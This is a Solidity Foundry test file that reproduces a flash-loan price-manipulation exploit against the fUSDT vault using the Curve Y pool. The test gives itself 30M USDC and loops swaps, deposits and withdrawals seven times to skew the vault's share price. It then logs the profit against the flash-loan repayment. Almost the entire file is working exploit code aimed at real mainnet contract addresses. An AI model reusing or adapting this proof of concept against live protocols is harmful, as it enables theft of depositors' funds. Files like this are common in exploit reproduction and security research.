// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;
import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}
interface ICurveYPool {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external;
}
interface IHVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function balanceOf(address) external view returns (uint256);
    function underlyingBalanceWithInvestment() external view returns (uint256);
}

contract TestUSDCOnlyFUSDT is Test {
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant CURVE = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
    address constant FUSDT = 0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C;

    function testUSDCOnlyLoop() public {
        // Simulate having 30M USDC (from flash) and NO USDT
        deal(USDC, address(this), 30_000_000e6);
        IERC20(USDC).approve(CURVE, type(uint256).max);
        // Safe USDT approve
        (bool s,) = USDT.call(abi.encodeWithSelector(bytes4(keccak256("approve(address,uint256)")), CURVE, type(uint256).max));
        require(s);
        (s,) = USDT.call(abi.encodeWithSelector(bytes4(keccak256("approve(address,uint256)")), FUSDT, type(uint256).max));
        require(s);

        uint256 usdcBefore = IERC20(USDC).balanceOf(address(this));
        
        // Step 1: Convert 10M USDC → USDT (dump buffer)
        ICurveYPool(CURVE).exchange_underlying(1, 2, 10_000_000e6, 0);
        uint256 usdtBuffer = IERC20(USDT).balanceOf(address(this));
        emit log_named_uint("USDT buffer acquired", usdtBuffer);

        // Step 2: Run pump-deposit-dump-withdraw loop (7 iterations)
        for (uint i = 0; i < 7; i++) {
            uint256 usdtPre = IERC20(USDT).balanceOf(address(this));
            
            // PUMP: 10M USDC → USDT
            ICurveYPool(CURVE).exchange_underlying(1, 2, 10_000_000e6, 0);
            uint256 pumpedUSDT = IERC20(USDT).balanceOf(address(this)) - usdtPre;
            
            // DEPOSIT
            IHVault(FUSDT).deposit(pumpedUSDT);
            
            // DUMP: 10M USDT → USDC (from buffer)
            ICurveYPool(CURVE).exchange_underlying(2, 1, 10_000_000e6, 0);
            
            // WITHDRAW
            uint256 shares = IHVault(FUSDT).balanceOf(address(this));
            IHVault(FUSDT).withdraw(shares);
        }
        
        // Step 3: Convert remaining USDT back to USDC
        uint256 remainingUSDT = IERC20(USDT).balanceOf(address(this));
        if (remainingUSDT > 1000) {
            ICurveYPool(CURVE).exchange_underlying(2, 1, remainingUSDT, 0);
        }

        uint256 usdcAfter = IERC20(USDC).balanceOf(address(this));
        emit log_named_uint("USDC before", usdcBefore);
        emit log_named_uint("USDC after", usdcAfter);
        emit log_named_int("USDC profit", int256(usdcAfter) - int256(usdcBefore));
        
        // Would need 30M * 1.003 = 30.09M to repay flash
        uint256 flashRepay = 30_000_000e6 * 1003 / 1000;
        emit log_named_uint("Flash repay needed", flashRepay);
        emit log_named_uint("Profitable after flash fee?", usdcAfter > flashRepay ? 1 : 0);
    }
}
